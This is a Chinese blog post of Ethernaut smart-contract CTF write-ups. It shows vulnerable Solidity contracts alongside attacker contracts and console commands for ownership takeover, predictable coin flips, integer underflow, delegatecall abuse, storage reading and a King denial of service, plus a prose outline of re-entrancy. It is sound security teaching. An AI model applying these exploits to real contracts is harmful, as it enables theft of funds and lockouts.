<!DOCTYPE html><html lang="zh_CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Ethernaut | LexLady</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 共 $1 行","copy":"复制","copyFinish":"完成","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="LexLady" type="application/atom+xml">
</head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>Ethernaut</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-02-25T12:44:02.000Z" id="date"> 2023-02-25</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-11-04T16:33:05.153Z" id="updated"> 2023-11-05</time></div></span></div></div><hr><div id="post-content"><p>此文章会记录在Ethernaut上经历的题。</p>
<span id="more"></span>
<h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><p>在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。<del>你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！</del><br>收获：  </p>
<ul>
<li>关键字的使用</li>
<li>各种变量的存储位置</li>
</ul>
<hr>
<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>要求我们获取合约的所有权就不需要通过另外的攻击合约来进行攻击只需要调用合约内方法进行实现，因此我们可以通过标记owner变量快速查询有关owner的代码。</p>
<p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p>
<p>解题参考：<br>1）执行实例中的contribute方法，向合约发送最多0.001ether。<br>2）向合约发送以太，触发receive方法。<br>3）执行实例中的withdraw方法</p>
<blockquote>
<p>receive方法</p>
<ul>
<li>一个合约至多含有一个receive()函数,</li>
<li>没有function关键字、没有参数，没有返回值</li>
<li>可见性必须声明为external，必须含有payable关键字</li>
<li>允许使用modifier修改器</li>
</ul>
<p>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发，执行ether的传输（类似于基本的send(),transfer()函数）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p>
<p>选自<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p>
</blockquote>
<hr>
<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><p>任务要求：获取合约的所有权<del>卖眼镜的做的题</del><br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  /* constructor */<br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>	        require(<br>	            msg.sender == owner,<br>	            &quot;caller is not the owner&quot;<br>	        );<br>	        _;<br>	    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Fallout is Ownable &#123;...<br><br>function Fal1out() public payable &#123;...<br></code></pre></td></tr></table></figure>
<p>注意solidity版本为0.6，这意味着该合约的构造函数是由<code>function 合约名</code>实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数</p>
<blockquote>
<p>在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。</p>
<blockquote>
<p>这是在使用编译器0.4.22之前的版本时所需注意的</p>
</blockquote>
</blockquote>
<p>参考：直接调用函数Fal1out</p>
<hr>
<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del><br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：<br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，但我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p>
<p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p>
<p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>之后连续使用攻击合约的flip方法进行攻击10次就行</p>
<blockquote>
<p>知识点<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p>
</blockquote>
<hr>
<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>本题涉及到tx.origin与msg.sender的区别：</p>
<blockquote>
<p>tx.origin是发起交易的账户<br>msg.sender是当前直接调用这个合约的即时账户</p>
</blockquote>
<p>例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：</p>
<table>
<thead>
<tr>
<th>Alice</th>
<th>-&gt;A</th>
<th>-&gt;B</th>
</tr>
</thead>
<tbody><tr>
<td>tx.origin</td>
<td>Alice</td>
<td>Alice</td>
</tr>
<tr>
<td>msg.sender</td>
<td>Alice</td>
<td>A</td>
</tr>
</tbody></table>
<p>如果情景是在一个合约下的调用，那么这两者是没有区别的；</p>
<h2 id="参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner"><a href="#参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner" class="headerlink" title="参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner"></a>参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(address _addr) &#123;<br>    Telephone(_addr).changeOwner(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></h2><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>任务要求：获取更多的Token<br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br></code></pre></td></tr></table></figure>
<p>这里可以通过<em>下溢</em> 绕过require检测，因为_value和balance[]都为无符号整数，所以结果会变为2^256-1</p>
<p>参考：略</p>
<blockquote>
<p>solidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行revert。</p>
</blockquote>
<hr>
<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback函数中使用了delegatecall来调用了delegate合约。</p>
<blockquote>
<p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool） 和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。<br>这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p>
</blockquote>
<p>解题点：<br><code>delegate.sol</code>合约中有一个公共的pwn函数，可以将owner更改为调用者。</p>
<p>而在<code>Delegation.sol</code>中，存储在slot0中的值恰好为我们要更改的目标——owner</p>
<p>因此只要我们通过调用Fallback函数，进行委托调用，更新owner。</p>
<p>解题参考：在控制台上直接调用<code>contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)</code>，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。</p>
<p>或者直接获取实例地址，在Delegate合约中Ataddress，通过调用pwn方法也能够实现目标。但可能因为gas原因无法正常交易，提高燃料限制再进行交易</p>
<hr>
<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>任务要求：让合约的balance大于0</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：<del>MEOW~（不是）</del></p>
<p>在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。</p>
<blockquote>
<p>这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。</p>
</blockquote>
<p>因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。</p>
<blockquote>
<p>在最新版本的solidity中selfdestruct已经被禁用了</p>
</blockquote>
<hr>
<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><p>任务要求：将合约中的bool值改变</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题点：输入密码<del>废话</del></p>
<p>任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值</p>
<blockquote>
<p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code><br>参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数<br>Returns ：返回给定位置的值</p>
<p>选自web3.<a target="_blank" rel="noopener" href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat">eth官方文档</a></p>
</blockquote>
<p>在控制台中输入<code>web3.eth.getStorageAt(InstenceAddress, 1)</code>，得到密码——因为在slot0中存储的是锁的状态，所以我们要的是slot1中的密码</p>
<p>接着，直接调用<code>contract.unlock(&quot;上面获得的数据&quot;)</code>就能通关了。</p>
<hr>
<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><p>任务要求：确保王位</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：<code>payable(king).transfer(msg.value);</code></p>
<p>当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king</p>
<p>参考：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma ...<br><br>contract attack&#123;<br>  constructor (address _addr) public payable&#123;<br>    _addr.call&#123;gas:100000000,value:msg.value&#125;;<br>  &#125;<br><br>  // 可以通过不创建任何Fallback或receive方法，也可以通过如下方法<br>  receive() external payable &#123;<br>    revert();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>任务要求：盗取合约中的所有代币</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>
<p>在整个合约中，只有这个函数才能将代币发送出去：他会接受一个输入，只要我们的余额大于等于指定的金额将会进行发送；然后更新余额。</p>
<p>因此这是个典型的重入攻击，我们在msg.sender.call()接受余额的同时执行我们的Fallback函数，在fallback中继续调用withdraw。</p>
<p>同时我们需要再某个时刻打破这个循环，否则会revert：首先可以获取目标合约的余额作为提取的最大金额，我们提取的金额最大为存入的金额，因此将其作为最小值。</p>
